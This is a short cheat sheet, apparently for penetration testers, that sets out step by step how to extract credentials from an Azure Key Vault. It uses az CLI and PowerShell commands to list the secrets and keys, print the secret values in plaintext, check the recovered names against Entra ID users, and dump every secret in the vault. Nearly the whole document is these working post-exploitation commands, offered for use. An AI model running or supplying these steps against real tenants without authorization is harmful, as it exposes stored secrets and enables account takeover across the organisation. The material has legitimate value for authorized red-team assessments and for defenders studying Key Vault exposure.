# Azure Key Vault Credential Extraction

#### 1)  Set variables

    $VaultName = "VAULT_NAME"

#### 2)  Set the current Azure subscription

    $SubscriptionID = SUBSCRIPTION_ID"
    az account set --subscription $SubscriptionID

#### 3)  List and store the secrets

    $secretsJson = az keyvault secret list --vault-name $VaultName -o json
    $secrets = $secretsJson | ConvertFrom-Json

#### 4)  List and store the keys

    $keysJson = az keyvault key list --vault-name $VaultName -o json
    $keys = $keysJson | ConvertFrom-Json

#### 5)  Output the secrets

    Write-Host "Secrets in vault $VaultName"
    foreach ($secret in $secrets) {
        Write-Host $secret.id
    }

#### 6)  Output the keys

    Write-Host "Keys in vault $VaultName"
    foreach ($key in $keys) {
        Write-Host $key.id
    }

#### 7) Set variables

    $VaultName = "VAULT_NAME"
    $SecretNames = @("NAME_1", "NAME_2", "NAME_3")

#### 8) Set the current Azure subscription

    $SubscriptionID = "SUBSCRIPTION_ID"
    az account set --subscription $SubscriptionID

#### 9) Retrieve and output the secret values

    Write-Host "Secret Values from vault $VaultName"
    foreach ($SecretName in $SecretNames) {
        $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
        $secretValue = ($secretValueJson | ConvertFrom-Json).value
        Write-Host "$SecretName - $secretValue"
    }

#### 10) Check if any of these extracted credentials are valid existing Entra ID users

    az ad user list --query "[?givenName=='NAME_1' || givenName=='NAME_2' || givenName=='NAME_3'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table

#### 11) Get all secrets from key vault

    Get-AzKeyVaultSecret -VaultName $VaultName | ForEach-Object { Get-AzKeyVaultSecret -VaultName $VaultName -Name $_.Name -asplaintext }
